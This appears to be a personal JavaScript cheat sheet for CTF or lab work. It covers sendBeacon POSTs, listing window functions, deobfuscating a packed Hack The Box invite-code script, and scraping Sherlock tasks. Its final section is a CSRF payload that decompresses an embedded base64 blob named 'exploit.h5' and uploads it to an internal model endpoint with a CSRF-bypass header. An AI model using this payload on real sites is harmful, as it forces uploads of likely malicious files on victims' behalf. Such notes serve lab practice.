# Javascript

## Fetch alternative for POST

[https://developer.mozilla.org/en-US/docs/Web/API/Navigator/sendBeacon](https://developer.mozilla.org/en-US/docs/Web/API/Navigator/sendBeacon)

```js
const url = 'https://example.com/log';
const data = 'type=text&title=test&text=letmein';

const success = navigator.sendBeacon(url, data);
if (success) { console.log('Data sent successfully.'); } 
else { console.error('Failed to send data.'); }
```

```js
const url = 'https://example.com/log';
const formData = new FormData();
formData.append('type', 'text');
formData.append('title', 'test');
formData.append('text', 'letmein');

const success = navigator.sendBeacon(url, formData);
if (success) { console.log('Data sent successfully.'); } 
else { console.error('Failed to send data.'); }
```

## Get all functions

```js
Object.keys(window).forEach((key, index) => {
  if (typeof window[key] === 'function') {
    console.log(`${index}: ${key}`);
  }
});
```

```js
Object.keys(window).forEach((key, index)=>{if(typeof window[key]==='function'){console.log(`${index}: ${key}`);}});
```

## Dump function code via console

```js
> functioName.toString()
...code...
```
#### Example

Obfuscated code:
```js
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))
```

Deobfuscated:
```js
> makeInviteCode.toString()
`function makeInviteCode(){$.ajax({type:"POST",dataType:"json",url:'/api/v1/invite/how/to/generate',success:function(response){console.log(response)},error:function(response){console.log(response)}})}`
```

## Get HTB Sherlock Questions

```js
var t='';document.querySelectorAll('.markdown-section p').forEach((e, i) => t+=`### Task ${i+1}. ${e.textContent}<br><br><br>`);document.write(t);
```

## CSRF form to upload a gzip compressed base64 blob

```js
async function DecompressBlob(blob) {
  const ds = new DecompressionStream("gzip");
  const decompressedStream = blob.stream().pipeThrough(ds);
  return await new Response(decompressedStream).blob();
}

function uploadFile(file) {
  const reader = new FileReader();

  reader.onload = function(event) {
    const blob = new Blob([event.target.result], { type: file.type });
    const formData = new FormData();
    formData.append('file', blob, file.name); 
    fetch('/api/internal/model', {
      method: 'POST',
      body: formData,
      headers: { "X-SPACE-NO-CSRF": "1" }
    })
    .then(data => console.log('File uploaded successfully:', data))
    .catch(error => console.error('Error uploading file:', error));
  };
  reader.readAsArrayBuffer(file);
}

const base64GzipString = "H4sICEOM8GYCA2V4cGxvaXQuaDUA7VnNT+NGFLfDVwRsxUo9QLut0nS7qlSKnBAKrLQtTggJXwUWCiELcif2JDHxV/1BFlCkHre3PfbYY4973GOP/RM4Vfsv9NYbnbHHjsdLgBXaShX+HWzPmzdvZl7e+3ny/Et5cene8EfDDEYyyfQzY0wYFwRvHtFtv/9HcmfJ/QW5/57w5YNu3ziRjxH7qT6vvUkG7jwtFrH2RQTBQsapW4w7hnKR38T3Cmlz5P5ngtZTdQkqQhvKjaZtobZu2LIqn0IzJAvH65fXzHufxGs0rkeZMrHzAfMhk2Ra0ASWcAxNS9Y1JJ9gWXfkWDBXkpp3sCtyZaPMAnlOuvZqQGxBTbrWznDIToJa1z3XjucPUdfqcoNx18Vcae/vRNdeH2VvzLVnm0DWZK3hm7zO3l9s117/FXzADXntP5ib8YHxwB8fI+aDbh6fD9J6ClBrEmAYWzcEBR6jXKAZgo3wyXXw47U84bWbjM8HFRL3oyhPxtG8J4hzNKBCj3F65gnLUvlyGT8MXMkPzI35YfCS/ZQKG2tsKJGo+RGyU5nsFOdxS2APwYaapZt1RW93uSLgD4SztKgAy3I9kH6cSm/Dnxyo2TJQ0pOptEceSH6W9hUsSsF1n4Xkz6KGljXDsddwd8RQDdhiU5Bxt2A1gYG1n2mOokymZudyh0hZsk9caRotG9jTWWzAMoBpYWEdKBZEAhM0GlAKCfyJPcuZdKczmYouas2Nsh47U4JOlzxBTcFi23RgjzXVHU200WsEbyCdaxd5Gsv4sogvW210Ka/v4ecqv9TiS22+vrU0xwM+X+VXm/xWka/z+R2+0FrccVr8gYY1vzqaOZIqK9ZyqclJ5fzphjx3LFWkTG163alqK0p1e0au7u0eVSt5rja97Oxn5+3lQqa0XJBUsPdc2fyBP96v5NsH2lq2au3viY5UbnIrJ61CtrFyLM7rJXFaOZVKu/bq1hrgK80THq9ztcWLjX289G/y6m5OLMy0oaSXq5Vmu1aaNw40iV9HvfnTfMPdZr7AF1f5rSdPDjTkFO+HxNfDkIcE33tdH6P0dlwHpwVBRe4WBCzVHTscF541ShqYMkE7OkIIjJKBwGw4KopWHKFnnU7nsNNhuu+44L3n5oGiW1Z3pAptUxZDAo+IoCS81YMH+jwVWnNwoAmFGh2NBceydfXbp+vbhqkbPaIy1OvNIUhQBCfdiURFNjTdVLuShqLXADpMvNWBJcdAcUIeciwoQBWE8gi1kB+x1xw8lJuanydSHR2b2qZsQ6Fuuiwg4mVkOA71H8k22qhqyEo4SWULkXkDiCdC4I5QrwKB6Z5RTGBDdyqOQ9Zc5GZz87O5mcw0TvWm7i3EDZvQyvDE0LBkxc3BDPyam8W7RArQ7HJDB//oAxG+9N83g9fw5VAPniVUzYyQO/IK2gUK9cf0G2pzOD4DxIgRI0aMGDFixHh3bH+/sciif/f+udPop+sAv5L2a3JQ9et25c9oPYO0X35+N/3o14mj/rq+TszcuE485Mr7Lq2fvv6Erkd59VOm9/eUGHH9NFQ/9fN//AGt58fh5nvim1cT9DznpP3Px358e0h9SuuVSbuZutt8E/UX/f1nnCG1naAQfT/1HfH9ApMbYXIXpHDr16Gj6MU3b1Ix38S4Pd+8SL1fvvHzJMoX/1WeJB967edUnvT+rvnyC9o/Me52nvjx9Cpyro7Whf2oXLhlnkTP8d3vmpfnybt+1xwJBXfSlQ94fayvR59/+5Bl/DyWZIJ8xBhALSxPJBKsZ8vzVB97/ujyDPrtf/R/jA1W//PDOCdug38BHoOoAuAmAAA=";
let bytes = Uint8Array.from(atob(base64GzipString), c => c.charCodeAt(0));
let blob = new Blob([bytes], { type: "application/gzip" });
let data = await DecompressBlob(blob);

// console.log(Array.from(new Uint8Array(await dec.arrayBuffer())).map(byte => byte.toString(16).padStart(2, '0')).join(' '));

const file = new File([data], "example.h5", { type: "text/plain" });
uploadFile(file); 
```